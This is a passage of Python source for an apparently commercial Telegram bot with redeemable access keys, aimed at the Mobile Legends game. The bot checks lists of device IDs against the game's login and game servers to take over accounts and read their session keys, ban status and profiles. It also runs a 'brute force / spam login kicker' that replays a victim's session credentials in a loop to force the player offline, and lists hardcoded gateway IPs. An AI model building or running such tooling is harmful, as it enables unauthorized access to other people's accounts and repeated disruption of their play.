    return _frame(1, 1, payload)


def _load_pool(path: str) -> List[str]:
    ids = []
    with open(path, encoding='utf-8', errors='ignore') as f:
        for line in f:
            did = line.strip()
            if did and (not did.lower().endswith('none')) and (len(did) >= 40):
                ids.append(did)
    return ids


class _Bucket:
    def __init__(self, rate: float):
        self._rate = rate
        self._tokens = rate
        self._last = time.monotonic()
        self._lock = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            delta = now - self._last
            self._last = now
            self._tokens = min(self._rate, self._tokens + delta * self._rate)
            if self._tokens < 1:
                wait = (1 - self._tokens) / self._rate
                await asyncio.sleep(wait)
                self._tokens = 0
            else:
                self._tokens -= 1


async def _read_n(r: asyncio.StreamReader, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        c = await r.read(n - len(buf))
        if not c:
            raise EOFError
        buf += c
    return buf


async def _get_game_server(acc, skey, zone, writer_login, reader_login) -> Optional[Tuple[str, int]]:
    try:
        payload = SDP({0: acc, 1: skey, 2: CLI_VER, 5: zone, 6: CHANNEL}).data
        writer_login.write(_frame(5, 2, payload))
        await asyncio.wait_for(writer_login.drain(), timeout=1.0)
        hdr = await asyncio.wait_for(_read_n(reader_login, 4), timeout=READ_TO)
        flags = int.from_bytes(hdr, 'big')
        size = flags & 16777215
        ct = flags >> 24
        body = await asyncio.wait_for(_read_n(reader_login, size - 4), timeout=READ_TO)
        body = _decode(ct, body)
        outer = SDP(body)
        if outer.get(0) != 6:
            return None
        raw = outer.get(6) or outer.get(5)
        if not isinstance(raw, bytes):
            return None
        inner = SDP(raw)
        addr = inner.get(1)
        if not addr or ':' not in str(addr):
            return None
        host, port = str(addr).split(':', 1)
        return host, int(port)
    except Exception:
        return None


async def _check_ban_on_conn(reader, writer) -> str:
    try:
        writer.write(_frame(10101, 2, SDP({0: 0, 2: 2}).data))
        await asyncio.wait_for(writer.drain(), timeout=1.0)
        for _ in range(5):
            try:
                hdr = await asyncio.wait_for(_read_n(reader, 4), timeout=READ_TO)
                flags = int.from_bytes(hdr, 'big')
                size = flags & 16777215
                ct = flags >> 24
                body = await asyncio.wait_for(_read_n(reader, size - 4), timeout=READ_TO)
                body = _decode(ct, body)
                outer = SDP(body)
                pid = outer.get(0)
                if pid == 20001:
                    raw = outer.get(6) or outer.get(5)
                    if isinstance(raw, bytes):
                        inner = SDP(raw)
                        binfo = inner.get(0)
                        if isinstance(binfo, (dict, SDP)):
                            reason = binfo.get('ban_reason', 'Unknown')
                            d = binfo.get('endtime_day', '0')
                            h = binfo.get('endtime_hour', '0')
                            m = binfo.get('endtime_min', '0')
                            s = binfo.get('endtime_sec', '0')
                            return f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                        for v in inner.values():
                            if isinstance(v, str) and any(
                                kw in v.lower() for kw in ('ban', 'suspend', 'freeze', 'limit')
                            ):
                                return f"BANNED ({v})"
                        return "BANNED (Unknown reason)"
                elif pid == 20002:
                    return "NORMAL"
                elif pid is None:
                    break
            except Exception:
                break
    except Exception:
        pass
    return "NORMAL"


async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[dict]:
    await bucket.acquire()
    async with sem:
        writer = None
        try:
            frame = _login_frame(did)
            r, w = await asyncio.wait_for(asyncio.open_connection(LOGIN_HOST, LOGIN_PORT), timeout=CONN_TO)
            writer = w
            w.write(frame)
            await asyncio.wait_for(w.drain(), timeout=1.0)
            hdr = await asyncio.wait_for(_read_n(r, 4), timeout=READ_TO)
            flags = int.from_bytes(hdr, 'big')
            size = flags & 16777215
            ct = flags >> 24
            body = await asyncio.wait_for(_read_n(r, size - 4), timeout=READ_TO)
            body = _decode(ct, body)
            outer = SDP(body)
            if outer.get(0) != 2:
                return None
            raw = outer.get(6) or outer.get(5)
            if not isinstance(raw, bytes):
                return None
            inner = SDP(raw)
            acc = inner.get(0)
            if not acc:
                return None
            skey = inner.get(1, '')
            creation_ts = inner.get(19, 0)
            zr = inner.get(2)
            if isinstance(zr, list):
                zones = [z for z in zr if isinstance(z, int)] if zr else [0]
            elif isinstance(zr, dict):
                zones = [zr.get(0, 0)]
            elif isinstance(zr, int):
                zones = [zr]
            else:
                zones = [0]
            zone = zones[0] if zones else 0
            gs_info = await _get_game_server(acc, skey, zone, w, r)
            player_data = None
            ban_status = "NORMAL"
            v2l_status = "N/A"

            if gs_info:
                gs_host, gs_port = gs_info
                gr = None
                gw = None
                try:
                    gr, gw = await asyncio.wait_for(
                        asyncio.open_connection(gs_host, gs_port), timeout=CONN_TO
                    )
                    auth_payload = SDP({0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: did}).data
                    gw.write(_frame(10001, 1, auth_payload))
                    await asyncio.wait_for(gw.drain(), timeout=1.0)
                    authed = False
                    for _ in range(10):
                        try:
                            ghdr = await asyncio.wait_for(_read_n(gr, 4), timeout=READ_TO)
                            gflags = int.from_bytes(ghdr, 'big')
                            gsize = gflags & 16777215
                            gct = gflags >> 24
                            gbody = await asyncio.wait_for(_read_n(gr, gsize - 4), timeout=READ_TO)
                            gbody = _decode(gct, gbody)
                            gouter = SDP(gbody)
                            gpid = gouter.get(0)
                            if gpid == 10002:
                                authed = True
                                break
                            elif gpid == 20001:
                                continue
                            else:
                                break
                        except Exception:
                            break
                    if authed:
                        ban_status = await _check_ban_on_conn(gr, gw)
                        v2l_status = await _get_v2l_status(gr, gw, acc, zone)
                        gw.write(_frame(11153, 3, SDP({1: int(acc)}).data))
                        await asyncio.wait_for(gw.drain(), timeout=1.0)
                        for _ in range(10):
                            try:
                                ghdr = await asyncio.wait_for(_read_n(gr, 4), timeout=READ_TO)
                                gflags = int.from_bytes(ghdr, 'big')
                                gsize = gflags & 16777215
                                gct = gflags >> 24
                                gbody = await asyncio.wait_for(_read_n(gr, gsize - 4), timeout=READ_TO)
                                gbody = _decode(gct, gbody)
                                gouter = SDP(gbody)
                                gpid = gouter.get(0)
                                if gpid == 11154:
                                    graw = gouter.get(6) or gouter.get(5)
                                    if isinstance(graw, bytes):
                                        player_data = extract_player_data(
                                            SDP(graw),
                                            created_ts=creation_ts,
                                            v2l_status=v2l_status,
                                        )
                                    break
                            except Exception:
                                break
                except Exception:
                    pass
                finally:
                    if gw:
                        try:
                            gw.close()
                            await gw.wait_closed()
                        except Exception:
                            pass

            return {
                'did': did,
                'acc': acc,
                'zone': zone,
                'ban_status': ban_status,
                'player': player_data,
            }
        except Exception:
            return None
        finally:
            if writer:
                try:
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass


key_manager = KeyManager()


# ────────────────────────────────────────────────────────────────
# BRUTE FORCE / SPAM LOGIN KICKER
# ────────────────────────────────────────────────────────────────

BACKUP_GATEWAYS = [
    (LOGIN_HOST, LOGIN_PORT),
    ('119.81.89.84', 30021),
    ('119.81.67.250', 30021),
    ('119.81.63.238', 30021),
    ('161.202.213.238', 30021)
]


def _sync_recv_frame(sock: socket.socket) -> Optional[Tuple[int, bytes]]:
    try:
        hdr = b''
        while len(hdr) < 4:
            chunk = sock.recv(4 - len(hdr))
            if not chunk:
                return None
            hdr += chunk
        flags = int.from_bytes(hdr, 'big')
        size = flags & 0xFFFFFF
        ct = flags >> 24
        body = b''
        remaining = size - 4
        while len(body) < remaining:
            chunk = sock.recv(remaining - len(body))
            if not chunk:
                return None
            body += chunk
        body = _decode(ct, body)
        outer = SDP(body)
        pid = outer.get(0)
        raw = outer.get(6) or outer.get(5)
        if isinstance(raw, bytes):
            return pid, raw
        return pid, b''
    except Exception:
        return None


def _sync_send_frame(sock: socket.socket, pid: int, seq: int, sdp: SDP):
    pkt = SDP({0: pid, 1: seq, 5: sdp.data}).data
    comp = zstd.compress(pkt)
    flags = (len(comp) + 4) | (16 << 24)
    sock.sendall(flags.to_bytes(4, 'big') + comp)


def _sync_get_v2l(sock: socket.socket, acc: int, zone: int) -> str:
    try:
        _sync_send_frame(sock, 10208, 4, SDP({0: int(acc), 1: int(zone)}))
        for _ in range(3):
            res = _sync_recv_frame(sock)
            if not res:
                break
            pid, raw = res
            if pid == 10208 and raw:
                inner = SDP(raw)
                for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5, 20, 21):
                    val = inner.get(tag)
                    if val is None:
                        continue
                    if isinstance(val, (int, float)):
                        return "Enabled" if int(val) > 0 else "Disabled"
                    if isinstance(val, str):
                        if val.lower() in ("1", "true", "enabled", "yes"):
                            return "Enabled"
                        if val.lower() in ("0", "false", "disabled", "no"):
                            return "Disabled"
            elif pid is None:
                break
    except Exception:
        pass

    try:
        _sync_send_frame(sock, 10145, 5, SDP({0: int(acc), 1: int(zone)}))
        for _ in range(3):
            res = _sync_recv_frame(sock)
            if not res:
                break
            pid, raw = res
            if pid in (10146, 10160) and raw:
                inner = SDP(raw)
                for tag in (10, 11, 13, 14, 15, 0, 2, 3, 5):
                    val = inner.get(tag)
                    if val is None:
                        continue
                    if isinstance(val, (int, float)):
                        return "Enabled" if int(val) > 0 else "Disabled"
                    if isinstance(val, str):
                        if val.lower() in ("1", "true", "enabled", "yes"):
                            return "Enabled"
                        if val.lower() in ("0", "false", "disabled", "no"):
                            return "Disabled"
            elif pid is None:
                break
    except Exception:
        pass

    return "N/A"


def fetch_session_profile(device_id: str) -> Optional[dict]:
    sock = None
    sock2 = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((LOGIN_HOST, LOGIN_PORT))
        sock.sendall(_login_frame(device_id))

        res = _sync_recv_frame(sock)
        if not res:
            return None
        pid, raw = res
        if pid != 2 or not raw:
            return None
        inner = SDP(raw)
        acc = inner.get(0)
        if not acc:
            return None
        skey = inner.get(1, '')
        creation_ts = inner.get(19, 0)
        zr = inner.get(2)
        if isinstance(zr, list):
            zones = [z for z in zr if isinstance(z, int)] if zr else [0]
        elif isinstance(zr, dict):
            zones = [zr.get(0, 0)]
        elif isinstance(zr, int):
            zones = [zr]
        else:
            zones = [0]
        zone = zones[0] if zones else 0

        payload_gs = SDP({0: acc, 1: skey, 2: CLI_VER, 5: zone, 6: CHANNEL}).data
        sock.sendall(_frame(5, 2, payload_gs))
        res = _sync_recv_frame(sock)
        if not res:
            return None
        pid, raw = res
        if pid != 6 or not raw:
            return None
        inner_gs = SDP(raw)
        addr = inner_gs.get(1)
        if not addr or ':' not in str(addr):
            return None
        gs_host, gs_port = str(addr).split(':', 1)
        gs_port = int(gs_port)

        player_data = {}
        ban_status = "NORMAL"
        v2l_status = "N/A"
        try:
            sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock2.settimeout(5)
            sock2.connect((gs_host, gs_port))
            auth_payload = SDP({
                0: acc, 1: skey, 2: zone, 4: CLI_VER, 13: CHANNEL, 15: device_id
            }).data
            sock2.sendall(_frame(10001, 1, auth_payload))
            sock2.sendall(_frame(10101, 2, SDP({0: 0, 2: 2}).data))

            authed = False
            for _ in range(10):
                res = _sync_recv_frame(sock2)
                if not res:
                    break
                pid, raw = res
                if pid == 10002:
                    authed = True
                    break
                elif pid == 20001:
                    continue
                else:
                    break

            if authed:
                for _ in range(5):
                    res = _sync_recv_frame(sock2)
                    if not res:
                        break
                    pid, raw = res
                    if pid == 20001 and raw:
                        b_inner = SDP(raw)
                        b_data = b_inner.get(0)
                        if isinstance(b_data, (dict, SDP)):
                            reason = b_data.get('ban_reason', 'Unknown')
                            d = b_data.get('endtime_day', '0')
                            h = b_data.get('endtime_hour', '0')
                            m = b_data.get('endtime_min', '0')
                            s = b_data.get('endtime_sec', '0')
                            ban_status = f"BANNED (Reason: {reason} | Remaining: {d}d {h}h {m}m {s}s)"
                        else:
                            for v in b_inner.values():
                                if isinstance(v, str) and any(
                                    kw in v.lower() for kw in ('ban', 'suspend', 'freeze', 'limit')
                                ):
                                    ban_status = f"BANNED ({v})"
                                    break
                            else:
                                ban_status = "BANNED (Unknown reason)"
                        break
                    elif pid == 20002:
                        ban_status = "NORMAL"
                        break

                v2l_status = _sync_get_v2l(sock2, acc, zone)

                sock2.sendall(_frame(11153, 3, SDP({1: int(acc)}).data))
                for _ in range(10):
                    res = _sync_recv_frame(sock2)
                    if not res:
                        break
                    pid, raw = res
                    if pid == 11154:
                        if raw:
                            result = SDP(raw)
                            player_data = extract_player_data(
                                result,
                                created_ts=creation_ts,
                                v2l_status=v2l_status,
                            ) or {}
                        break
        except Exception:
            pass

        return {
            'device_id': device_id,
            'account_id': acc,
            'session_key': skey,
            'zone_id': zone,
            'creation_ts': creation_ts,
            'game_host': gs_host,
            'game_port': gs_port,
            'gs_info': f"{gs_host}:{gs_port}",
            'ban_status': ban_status,
            'v2l_status': v2l_status,
            'created_at': player_data.get('created_at', 'N/A') if isinstance(player_data, dict) else fmt_created_at(creation_ts),
            'nickname': player_data.get('nickname', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
            'level': player_data.get('level', 0) if isinstance(player_data, dict) else 0,
            'rank': player_data.get('current_rank', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
            'highest_rank': player_data.get('high_rank', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
            'skin_count': player_data.get('skin_count', 0) if isinstance(player_data, dict) else 0,
            'hero_count': player_data.get('hero_count', 0) if isinstance(player_data, dict) else 0,
        }
    except Exception as e:
        logger.error(f"fetch_session_profile error: {e}")
        return None
    finally:
        for s in (sock, sock2):
            if s:
                try:
                    s.close()
                except Exception:
                    pass


def send_session_kick(profile: dict, timeout: float = 4.5) -> Tuple[bool, float, str]:
    t0 = time.time()
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((profile['game_host'], profile['game_port']))

        body_struct = SDP({
            0: profile['account_id'],
            1: profile['session_key'],
            2: profile['zone_id'],
            4: CLI_VER,
            13: CHANNEL,
            15: profile['device_id']
        }).data

        pkt = SDP({0: 10001, 1: 1, 5: body_struct}).data
        comp = zstd.compress(pkt)
        flags = (len(comp) + 4) | (16 << 24)
        sock.sendall(flags.to_bytes(4, 'big') + comp)

        pkt2 = SDP({0: 10101, 1: 2, 5: SDP({0: 0, 2: 2}).data}).data
        comp2 = zstd.compress(pkt2)
        flags2 = (len(comp2) + 4) | (16 << 24)
        sock.sendall(flags2.to_bytes(4, 'big') + comp2)

        got_ack = False
        try:
            sock.settimeout(min(2.0, timeout))
            hdr = b''
            while len(hdr) < 4:
                chunk = sock.recv(4 - len(hdr))
                if not chunk:
                    break
                hdr += chunk
            if len(hdr) >= 4:
                fl = int.from_bytes(hdr, 'big')
                sz = fl & 0xFFFFFF
                remaining = sz - 4
                body = b''
                while len(body) < remaining:
                    chunk = sock.recv(remaining - len(body))
                    if not chunk:
                        break
                    body += chunk
                if len(body) >= remaining:
                    got_ack = True
        except socket.timeout:
            pass
        except Exception:
            pass

        elapsed_ms = (time.time() - t0) * 1000
        try:
            sock.close()
        except Exception:
            pass
        return True, elapsed_ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        return False, elapsed_ms, "TIMEOUT"
    except Exception as e:
        elapsed_ms = (time.time() - t0) * 1000
        if sock:
            try:
                sock.close()
            except Exception:
                pass
        return False, elapsed_ms, str(e)


async def run_kick_loop(profile: dict, total_loops: int, delay_sec: float,
                        progress_cb=None, cancel_check=None) -> dict:
    loop = asyncio.get_event_loop()
    count = 0
    success_count = 0
    fail_count = 0
    latencies = []
    start_time = time.time()

    while True:
        if cancel_check and cancel_check():
            break

        ok, lat, desc = await loop.run_in_executor(
            None, lambda: send_session_kick(profile)
        )
        count += 1
        latencies.append(lat)

        if ok:
            success_count += 1
        else:
            fail_count += 1

        if progress_cb:
            try:
                await progress_cb(count, success_count, fail_count, lat, desc)
            except Exception:
                pass

        if total_loops > 0 and count >= total_loops:
            break

        if delay_sec > 0:
            await asyncio.sleep(delay_sec)
        elif total_loops == 0:
            await asyncio.sleep(0.2)

    duration = time.time() - start_time
    avg_lat = (sum(latencies) / len(latencies)) if latencies else 0.0
    succ_pct = (success_count / count * 100) if count > 0 else 0.0
    speed = (count / duration) if duration > 0 else 0.0

    return {
        'count': count,
        'success': success_count,
        'failed': fail_count,
        'duration': duration,
        'avg_latency': avg_lat,
        'success_pct': succ_pct,
        'speed': speed
    }


# ────────────────────────────────────────────────────────────────
# END BRUTE FORCE MODULE
# ────────────────────────────────────────────────────────────────


class MLBBBot:
    def __init__(self):
        self.active_tasks = {}
        self.live_stats = {}
        # Multi-device support: keyed by (user_id, device_id) tuple
        self.bf_profiles = {}
        self.bf_cancel_flags = {}
        self.bf_running = {}
        self.bf_tasks = {}
        self.bf_running_lock = asyncio.Lock()
        self.bf_kick_logs = {}

    def _is_admin(self, user_id: int) -> bool:
        return user_id in ADMIN_IDS

    def _check_access(self, user_id: int) -> bool:
        return key_manager.has_access(user_id)

    def _bf_is_active(self, user_id: int, device_id: str) -> bool:
        """Check if a kicker is active for this specific (user, device) pair."""
        key = (user_id, device_id)
        task = self.bf_tasks.get(key)
        if task is None:
            return False
        if task.done():
            self.bf_tasks.pop(key, None)
            self.bf_running.pop(key, None)
            return False
        return True

    def _bf_user_active_count(self, user_id: int) -> int:
        """Count how many kickers this user currently has running."""
        count = 0
        for (uid, did), task in list(self.bf_tasks.items()):
            if uid != user_id:
                continue
            if task and not task.done():
                count += 1
            else:
                self.bf_tasks.pop((uid, did), None)
                self.bf_running.pop((uid, did), None)
        return count

    def _bf_user_active_devices(self, user_id: int) -> list:
        """Get list of device IDs the user is currently kicking."""
        devices = []
        for (uid, did), task in list(self.bf_tasks.items()):
            if uid != user_id:
                continue
            if task and not task.done():
                devices.append(did)
            else:
                self.bf_tasks.pop((uid, did), None)
                self.bf_running.pop((uid, did), None)
        return devices

    def _count_active_kickers(self) -> int:
        """Count all active kickers globally."""
        count = 0
        for key, task in list(self.bf_tasks.items()):
            if task and not task.done() and key in self.bf_running:
                count += 1
            else:
                if task and task.done():
                    self.bf_tasks.pop(key, None)
                    self.bf_running.pop(key, None)
        return count

    # ────────────────────────────────────────────────────────────────
    # START / MENU
    # ────────────────────────────────────────────────────────────────

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        has_access = self._check_access(user_id)
        is_admin = self._is_admin(user_id)
        expiry = key_manager.get_expiry(user_id)
        if is_admin:
            status_line = "Role: Admin"
        elif has_access:
            status_line = f"Access until: {expiry}"
        else:
            status_line = "No active access"
        welcome_msg = (
            f"MLBB Device ID Validator Bot\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"User: {update.effective_user.first_name}\n"
            f"{status_line}\n\n"
        )
        keyboard = []
        if has_access or is_admin:
            keyboard.append([InlineKeyboardButton("📁 Check from File", callback_data="check_file")])
            keyboard.append([InlineKeyboardButton("🎲 Generate & Check", callback_data="generate")])
            keyboard.append([InlineKeyboardButton("⚡ BruteForce", callback_data="bf_help")])
            keyboard.append([InlineKeyboardButton("📱 My Devices", callback_data="my_devices")])
        if not has_access and not is_admin:
            welcome_msg += "You need an access key to use this bot.\nUse /redeem <KEY> to activate."
        if is_admin:
            keyboard.append([InlineKeyboardButton("🔑 Admin Panel", callback_data="admin_panel")])
        keyboard.append([InlineKeyboardButton("📋 My Status", callback_data="my_status")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_msg, reply_markup=reply_markup)

    async def redeem_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not context.args:
            await update.message.reply_text("Usage: /redeem <KEY>")
            return
        key = context.args[0].strip()
        ok, msg = key_manager.redeem_key(key, update.effective_user.id)
        await update.message.reply_text(f"{'✅' if ok else '❌'} {msg}")

    async def genkey_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text(
                "Usage: /genkey <duration>\n\n"
                "Examples:\n"
                "/genkey 1h — 1 hour\n"
                "/genkey 7d — 7 days\n"
                "/genkey 1m — 1 month\n"
                "/genkey 1y — 1 year\n"
                "/genkey 2w — 2 weeks"
            )
            return
        seconds, label = parse_duration(context.args[0])
        if seconds is None:
            await update.message.reply_text("❌ Invalid duration.\nUse: 1h, 7d, 1m, 1y, 2w")
            return
        key = key_manager.generate_key(seconds, label, update.effective_user.id)
        await update.message.reply_text(
            f"✅ Key Generated!\n\nKey: {key}\nDuration: {label}\n\nRedeem: /redeem {key}"
        )

    async def listkeys_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        keys = key_manager.list_keys(show_used=False)
        if not keys:
            await update.message.reply_text("No unused keys.")
            return
        lines = ["🔑 Unused Keys:\n"]
        for k in keys[:20]:
            lines.append(f"{k['key']} — {k['label']}")
        await update.message.reply_text("\n".join(lines))

    async def listusers_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        users = key_manager.list_users()
        if not users:
            await update.message.reply_text("No users.")
            return
        lines = ["👥 Users:\n"]
        for u in users[:30]:
            status = "✅" if u["active"] else "❌"
            lines.append(f"{status} UID: {u['uid']} | Expires: {u['expires']}")
        await update.message.reply_text("\n".join(lines))

    async def revoke_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /revoke <user_id>")
            return
        try:
            target = int(context.args[0])
        except ValueError:
            await update.message.reply_text("Invalid user ID.")
            return
        ok = key_manager.revoke_user(target)
        await update.message.reply_text(f"{'✅ Revoked.' if ok else '❌ Not found.'}")

    async def delkey_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /delkey <KEY>")
            return
        ok = key_manager.delete_key(context.args[0])
        await update.message.reply_text(f"{'✅ Deleted.' if ok else '❌ Not found.'}")

    async def help(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        is_admin = self._is_admin(update.effective_user.id)
        help_text = (
            "Commands:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "/start — Main menu\n"
            "/redeem <KEY> — Activate key\n"
            "/bf <device_id> — Brute Force / Spam Login Kicker\n"
            "/bfstatus — Show all your kickers\n"
            "/stop_bf — Stop ALL your kickers\n"
            "/mydevices — Show active devices & limit\n"
            "/help — Show this\n"
        )
        if is_admin:
            help_text += (
                "\nAdmin:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "/genkey <dur> — Generate key\n"
                "/listkeys — Unused keys\n"
                "/listusers — All users\n"
                "/revoke <uid> — Revoke access\n"
                "/delkey <KEY> — Delete key\n"
                "/setdevlimit <uid> <n> — Set concurrent limit\n"
                "/adddevlimit <uid> <n> — Add to concurrent limit\n"
                "/checkdevlimit <uid> — Check user's limit\n"
                "/resetdevlimit <uid> — Reset user's limit\n"
                "/listdevlimits — List all custom limits\n"
                "/activekickers — Show all active kickers\n"
            )
        await update.message.reply_text(help_text)

    # ────────────────────────────────────────────────────────────────
    # ADMIN DEVICE LIMIT COMMANDS
    # ────────────────────────────────────────────────────────────────

    async def setdevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: /setdevlimit <user_id> <limit>\n\n"
                "Sets the MAX CONCURRENT devices for a user.\n\n"
                "Examples:\n"
                "/setdevlimit 123456789 5 — Allow 5 concurrent\n"
                "/setdevlimit 123456789 1 — Reset to 1"
            )
            return
        try:
            target_uid = int(context.args[0])
            limit = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID or limit. Must be numbers.")
            return
        if limit < 1:
            await update.message.reply_text("❌ Limit must be at least 1.")
            return
        key_manager.set_device_limit(target_uid, limit)
        await update.message.reply_text(
            f"✅ Concurrent device limit set!\n\n"
            f"User: {target_uid}\n"
            f"Max Concurrent: {limit}\n\n"
            f"User can now run up to {limit} kicker(s) simultaneously."
        )

    async def adddevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if len(context.args) < 2:
            await update.message.reply_text(
                "Usage: /adddevlimit <user_id> <amount>\n\n"
                "Examples:\n"
                "/adddevlimit 123456789 2 — Add 2 more slots\n"
                "/adddevlimit 123456789 5 — Add 5 more slots"
            )
            return
        try:
            target_uid = int(context.args[0])
            amount = int(context.args[1])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID or amount. Must be numbers.")
            return
        if amount < 1:
            await update.message.reply_text("❌ Amount must be at least 1.")
            return
        new_limit = key_manager.add_device_limit(target_uid, amount)
        await update.message.reply_text(
            f"✅ Concurrent device limit increased!\n\n"
            f"User: {target_uid}\n"
            f"Added: +{amount}\n"
            f"New Max Concurrent: {new_limit}"
        )

    async def checkdevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /checkdevlimit <user_id>")
            return
        try:
            target_uid = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
            return
        limit = key_manager.get_device_limit(target_uid)
        active = key_manager.get_user_devices(target_uid)
        lifetime = key_manager.get_lifetime_devices(target_uid)

        active_list = "\n".join(f"  • {d[:50]}..." for d in active[:10]) if active else "  None"
        lifetime_list = "\n".join(f"  • {d[:50]}..." for d in lifetime[:10]) if lifetime else "  None"

        await update.message.reply_text(
            f"📋 Device Limit Info\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"User: {target_uid}\n"
            f"Max Concurrent: {limit}\n"
            f"Active Now: {len(active)}\n\n"
            f"🟢 Active Devices:\n{active_list}\n\n"
            f"📜 Lifetime History ({len(lifetime)}):\n{lifetime_list}"
        )

    async def resetdevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        if not context.args:
            await update.message.reply_text("Usage: /resetdevlimit <user_id>")
            return
        try:
            target_uid = int(context.args[0])
        except ValueError:
            await update.message.reply_text("❌ Invalid user ID.")
            return
        key_manager.reset_device_limit(target_uid)
        await update.message.reply_text(
            f"✅ Reset complete!\n\n"
            f"User: {target_uid}\n"
            f"Concurrent limit reset to: 1\n"
            f"Active device list cleared."
        )

    async def listdevlimits_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        limits = key_manager.list_device_limits()
        if not limits:
            await update.message.reply_text("No custom device limits set. All users default to 1.")
            return
        lines = ["📋 Device Limits\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
        for item in sorted(limits, key=lambda x: x['limit'], reverse=True):
            lines.append(
                f"👤 {item['uid']} — Limit: {item['limit']} | Active: {item['used']}"
            )
        await update.message.reply_text("\n".join(lines[:30]))

    async def activekickers_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self._is_admin(update.effective_user.id):
            await update.message.reply_text("❌ Admin only.")
            return
        active = []
        for (uid, did), task in list(self.bf_tasks.items()):
            if task and not task.done():
                st = self.bf_running.get((uid, did))
                if st:
                    elapsed = time.time() - st['started_at']
                    profile = st.get('profile', {})
                    active.append({
                        'uid': uid,
                        'device_id': did,
                        'nickname': profile.get('nickname', 'Unknown'),
                        'account': profile.get('account_id', '?'),
                        'count': st['count'],
                        'success': st['success'],
                        'failed': st['failed'],
                        'elapsed': elapsed,
                        'total': st['total_loops'],
                        'last_latency': st.get('last_latency', 0),
                        'last_status': st.get('last_status', 'N/A'),
                    })
            else:
                self.bf_tasks.pop((uid, did), None)
                self.bf_running.pop((uid, did), None)

        if not active:
            await update.message.reply_text(
                "📊 Active Kickers\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "🟢 No active kickers running."
            )
            return

        lines = [f"📊 Active Kickers ({len(active)})\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
        for i, k in enumerate(active, 1):
            loop_str = f"{k['count']}/{k['total']}" if k['total'] > 0 else f"{k['count']}/∞"
            speed = k['count'] / k['elapsed'] if k['elapsed'] > 0 else 0
            lines.append(
                f"{i}. 👤 {k['nickname']} (ID: {k['account']})\n"
                f"   User: {k['uid']}\n"
                f"   Device: ...{k['device_id'][-8:]}\n"
                f"   Loop: {loop_str} | Speed: {speed:.1f}/s\n"
                f"   ✅ {k['success']} | ❌ {k['failed']}\n"
                f"   ⚡ {k['last_latency']:.0f}ms\n"
                f"   📡 {k['last_status']}\n"
                f"   ⏱ {int(k['elapsed'] // 60)}m {int(k['elapsed'] % 60)}s\n"
            )
        await update.message.reply_text("\n".join(lines))

    # ────────────────────────────────────────────────────────────────
    # USER DEVICES COMMAND
    # ────────────────────────────────────────────────────────────────

    async def mydevices_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        max_devices = key_manager.get_device_limit(user_id)
        active_devices = key_manager.get_user_devices(user_id)
        lifetime_devices = key_manager.get_lifetime_devices(user_id)
        active_count = self._bf_user_active_count(user_id)

        if not active_devices:
